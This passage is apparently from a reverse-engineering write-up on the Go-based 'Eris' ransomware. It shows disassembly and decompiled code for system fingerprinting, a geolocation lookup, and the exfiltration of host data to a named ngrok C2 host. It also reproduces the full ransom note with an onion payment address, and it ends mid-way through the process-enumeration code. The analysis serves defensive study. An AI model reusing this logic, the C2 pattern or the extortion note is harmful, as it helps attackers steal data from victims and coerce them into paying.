<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f818f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8193</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8196</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.golang.org_x_sys_windows.GetDriveType</span>
</code></pre></div><p>The information for each drive is stored in a slice of structs as shown below.</p>
<p>Returns:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go">    []<span style="color:#66d9ef">struct</span> {
        <span style="color:#a6e22e">Alphabet</span> <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;alphabet&#34;`</span>
        <span style="color:#a6e22e">Label</span> <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;label&#34;`</span>
        <span style="color:#a6e22e">Type</span> <span style="color:#66d9ef">int</span> <span style="color:#e6db74">`json:&#34;type&#34;`</span>
        <span style="color:#a6e22e">Free</span> <span style="color:#66d9ef">int64</span> <span style="color:#e6db74">`json:&#34;free&#34;`</span>
        <span style="color:#a6e22e">Full</span> <span style="color:#66d9ef">int64</span> <span style="color:#e6db74">`json:&#34;full&#34;`</span>
    }
</code></pre></div><p>Operating information is collected from the registry key <code>ProductName</code>.  Below
is a Ghidra decompiled representation of the function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> fcn.Eris_Sync.GetOS(undefined4 uParm1, undefined4 uParm2)
{
    <span style="color:#66d9ef">while</span> (puVar1 <span style="color:#f92672">=</span> (uint32_t <span style="color:#f92672">*</span>)(<span style="color:#f92672">**</span>(int32_t <span style="color:#f92672">**</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>),
            register0x00000010 <span style="color:#f92672">&lt;</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>puVar1 <span style="color:#f92672">||</span> (undefined <span style="color:#f92672">*</span>)register0x00000010 <span style="color:#f92672">==</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>puVar1) {
        fcn.runtime.morestack_noctxt();
    }
    uParm1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    uParm2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf003f</span>;
    key <span style="color:#f92672">=</span> fcn.golang.org_x_sys_windows_registry.OpenKey(<span style="color:#ae81ff">0x80000002</span>, <span style="color:#e6db74">&#34;SOFTWARE</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Microsoft</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows NT</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">CurrentVersion&#34;</span>, <span style="color:#ae81ff">0xf003f</span>);
    fcn.runtime.deferproc(<span style="color:#ae81ff">0xc</span>, <span style="color:#ae81ff">0x68afc4</span>, uStack24);
    <span style="color:#66d9ef">if</span> (key <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
        <span style="color:#66d9ef">if</span> (iStack20 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
            prod_name <span style="color:#f92672">=</span> fcn.golang.org_x_sys_windows_registry_Key.GetStringValue(key, <span style="color:#e6db74">&#34;ProductName&#34;</span>);
            uParm1 <span style="color:#f92672">=</span> uVar3;
            <span style="color:#66d9ef">if</span> (prod_name <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
                fcn.runtime.deferreturn();
                <span style="color:#66d9ef">return</span> prod_name;
            }
    }
    fcn.runtime.deferreturn();
    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;unknown&#34;</span>;
}
</code></pre></div><p>Geo-location is gathered by performing a request to <code>extreme-ip-lookup.com</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f84c4</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">sym.type.http.Client</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f84ca</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f84cd</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.newobject</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f84d2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f84d6</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_34h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f84da</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x14</span>], <span style="color:#ae81ff">0x540be400</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f84e1</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x18</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f84e8</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">sym.type.Struct.Geo</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f84ee</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f84f1</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.newobject</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f84f6</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f84fa</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_44h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f84fe</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#ae81ff">0x673fa6</span>] <span style="color:#75715e">; &#34;GET&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005f8504</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8507</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">3</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f850f</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#ae81ff">0x67f274</span>] <span style="color:#75715e">; &#34;http://extreme-ip-lookup.com/json/
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005f8515</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8519</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#ae81ff">0x22</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8521</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8529</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_14h</span>], <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8531</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.net_http.NewRequest</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8536</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_18h</span>]
</code></pre></div><p>User agent used: <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36</code></p>
<p>Data returned from the service:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Struct</span>.<span style="color:#a6e22e">Geo</span> <span style="color:#66d9ef">struct</span> {
    <span style="color:#a6e22e">BusinessName</span>    <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">BusinessWebsite</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">City</span>            <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Continent</span>       <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Country</span>         <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">CountryCode</span>     <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">IPName</span>          <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">IPType</span>          <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Isp</span>             <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Lat</span>             <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Lon</span>             <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Org</span>             <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Query</span>           <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Region</span>          <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Status</span>          <span style="color:#66d9ef">string</span>
}
</code></pre></div><p>The data is sent to the C2 server located at <code>d9d120a3.ngrok.io</code>.  The malware
tries three times.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">     <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe815</span>  <span style="color:#66d9ef">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
 <span style="color:#a6e22e">.-</span><span style="color:#960050;background-color:#1e0010">&gt;</span> <span style="color:#ae81ff">0x005fe817</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_94h</span>], <span style="color:#66d9ef">eax</span>
 <span style="color:#960050;background-color:#1e0010">:</span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe81e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">session</span>]
 <span style="color:#960050;background-color:#1e0010">:</span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe825</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x14</span>]
 <span style="color:#960050;background-color:#1e0010">:</span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe828</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x18</span>]
 <span style="color:#960050;background-color:#1e0010">:</span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe82b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebp</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x1c</span>]
 <span style="color:#960050;background-color:#1e0010">:</span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe82e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">edx</span>
 <span style="color:#960050;background-color:#1e0010">:</span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe831</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">ebx</span>
 <span style="color:#960050;background-color:#1e0010">:</span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe835</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">ebp</span>
 <span style="color:#960050;background-color:#1e0010">:</span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe839</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.Eris_Sync.GetSyns</span>
 <span style="color:#960050;background-color:#1e0010">:</span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe83e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_18h</span>]
 <span style="color:#960050;background-color:#1e0010">:</span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe842</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">,==&lt;</span> <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe844</span>  <span style="color:#66d9ef">je</span> <span style="color:#ae81ff">0x5fe853</span>
<span style="color:#960050;background-color:#1e0010">|:</span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe846</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_94h</span>]
<span style="color:#960050;background-color:#1e0010">|:</span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe84d</span>  <span style="color:#66d9ef">inc</span> <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">|:</span>   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe84e</span>  <span style="color:#66d9ef">cmp</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">3</span>
<span style="color:#960050;background-color:#1e0010">|`=&lt;</span> <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe851</span>  <span style="color:#66d9ef">jle</span> <span style="color:#ae81ff">0x5fe817</span>
<span style="color:#960050;background-color:#1e0010">`--&gt;</span> <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe853</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">session</span>]
</code></pre></div><p>Summary of function that sends the data:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span>x005f8fa0:
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8fb9</span> <span style="color:#66d9ef">sym.type.http.Client</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8fc2</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.newobject</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8ffd</span> <span style="color:#66d9ef">sym.type.string</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f9007</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">d9d120a3.ngrok.io</span><span style="color:#960050;background-color:#1e0010">&#34;</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f9015</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">redirect</span><span style="color:#960050;background-color:#1e0010">&#34;</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f901f</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">https</span>:<span style="color:#960050;background-color:#1e0010">//</span>%s<span style="color:#960050;background-color:#1e0010">/%&#34;</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f9048</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.fmt.Sprintf</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f905e</span> <span style="color:#66d9ef">sym.type.bytes.Buffer</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f9067</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.newobject</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f9086</span> <span style="color:#66d9ef">cjmp</span> <span style="color:#ae81ff">0x005f92c5</span>
<span style="color:#960050;background-color:#1e0010">0</span>x005f9092:
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f9092</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">POST</span><span style="color:#960050;background-color:#1e0010">&#34;</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f90c1</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.net_http.NewRequest</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f90d6</span> <span style="color:#66d9ef">sym.type.Struct.Response</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f90df</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.newobject</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f90ee</span> <span style="color:#66d9ef">cjmp</span> <span style="color:#ae81ff">0x005f9118</span>
<span style="color:#960050;background-color:#1e0010">0</span>x005f90f0:
<span style="color:#960050;background-color:#1e0010">0</span>x005f9118:
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f9129</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">User-Agent</span><span style="color:#960050;background-color:#1e0010">&#34;</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f913a</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.net_textproto.CanonicalMIMEHeaderKey</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f914f</span> <span style="color:#66d9ef">sym.type._1_string</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f9158</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.newobject</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f9174</span> <span style="color:#66d9ef">cjmp</span> <span style="color:#ae81ff">0x005f92b5</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f917a</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">Mozilla</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#ae81ff">5</span><span style="color:#66d9ef">.0</span> (<span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">NT</span> <span style="color:#ae81ff">10</span><span style="color:#66d9ef">.0</span><span style="color:#75715e">; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005f9182</span>:
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f9182</span> <span style="color:#66d9ef">sym.type.textproto.MIMEHeader</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f91a3</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.mapassign_faststr</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f91c2</span> <span style="color:#66d9ef">cjmp</span> <span style="color:#ae81ff">0x005f92a7</span>
<span style="color:#960050;background-color:#1e0010">0</span>x005f91ce:
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f91de</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.net_http___Client_.do</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f91ed</span> <span style="color:#66d9ef">cjmp</span> <span style="color:#ae81ff">0x005f91f8</span>
<span style="color:#960050;background-color:#1e0010">0</span>x005f91ef:
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f91f3</span> <span style="color:#66d9ef">jmp</span> <span style="color:#ae81ff">0x005f90f0</span>
<span style="color:#960050;background-color:#1e0010">0</span>x005f91f8:
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f91fe</span> <span style="color:#66d9ef">sym.type.io.Reader</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f920f</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.convI2I</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f9234</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.io_ioutil.readAll</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f924b</span> <span style="color:#66d9ef">cjmp</span> <span style="color:#ae81ff">0x005f91ef</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f9258</span> <span style="color:#66d9ef">sym.type._Struct.Response</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f926a</span> <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.encoding_json.Unmarshal</span>
</code></pre></div><p>The server response with the following data in JSON:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Struct</span>.<span style="color:#a6e22e">Response</span> <span style="color:#66d9ef">struct</span> {
    <span style="color:#a6e22e">Response</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">Code</span>     <span style="color:#66d9ef">int</span>
}
</code></pre></div><h3 id="ransomware-initialization">Ransomware initialization</h3>
<p>Before encrypting files, the malware prepares the ransom note. The note is
shown below.  The malware performs the following operations on the note
template:</p>
<ul>
<li>Replace <code>{version}</code> with <code>2.0.3</code></li>
<li>Replace <code>{host}</code> with <code>[[epaybfvlutydks6fpfwtwoe2fsph6vve2obgv6qbhyuqwkecbhsf7nyd.onion]]</code></li>
<li>Replace <code>{id}</code> with the id.</li>
<li>Replace <code>{identification}</code> with base58 encoded encrypted key.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">***                                                 ***\x0d
*** READ THIS FILE CAREFULLY TO RECOVERY YOUR FILES ***\x0d
***                                                 ***\x0d
\x0d
\x0d
\x0d
ALERT! \x0d
ALL OF YOUR FILES HAVE BEEN ENCRYPTED BY &#34;ERIS RANSOMWARE&#34; v{version}!\x0d
\x0d
Welcome to Eris System Security Encryption Program!\x0d
\x0d
Keeping strong security for our clients in mind, we have implemented Strong Encryption Algorithm for securing the system.\x0d
\x0d
To personally update regarding the available decryption software and payment methods. Follow the steps below to access the payment page.\x0d
\x0d
\x0d
Follow the steps below to access payment page.\x0d
\x0d
1. Download and install Tor browser from here:\x0d
   URL - https://www.torproject.org/download/\x0d
\x0d
2. Visit page below using Tor browser:\x0d
   URL - http://{host}/{id}\x0d
\x0d
3. Enter your &#34;ERIS IDENTIFICATION&#34;. (You can find it in below)\x0d
\x0d
4. Follow the next steps(instructions) displayed on the page for successful decryption.\x0d
\x0d
Note: \x0d
We only accept payments via Bitcoin (BTC)!\x0d
\x0d
\x0d
ERIS IDENTIFICATION:\x0d
\x0d
{identification}\x0d
\x0d
\x0d
* IF YOU NOT FOLLOW INSTRUCTIONS IN PAYMENT PAGE MORE THAN  7 DAYS!,\x0d
  YOUR CANNOT ACCESS TO PAYMENT PAGE OR YOUR FILES ANYMORE!\x0d
  \x0d
* IN CASE OF FOLLOWING OUR INSTRUCTION,\x0d
  FAST AND EASILY EVERYTHING IS BACK TO NORMAL LIKE THAT NEVER HAPPENED!\x0d
  BUT IF YOU USE OTHER METHODS (THAT NEVER EVER HELPS) YOU JUST DESTROY EVERYTHING FOR GOODNESS!\x0d
\x0d
---------------------------------\x0d
* DO NOT MODIFY ENCRYPTED FILE(S)\x0d
* DO NOT MOVE ENCRYPTED FILES\x0d
* DO NOT USE RECOVERY SOFTWARE(S)\x0d
---------------------------------
</code></pre></div><h3 id="process-enumeration">Process enumeration</h3>
<p>The malware enumerates all the running processes:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d024</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">sym.pCreateToolhelp32Snapshot</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d02a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d02d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d031</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d039</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d041</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.syscall___LazyProc_.Call</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d046</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d04a</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d04c</span>  <span style="color:#66d9ef">jb</span> <span style="color:#ae81ff">0x53d326</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d052</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_34h</span>], <span style="color:#66d9ef">eax</span>
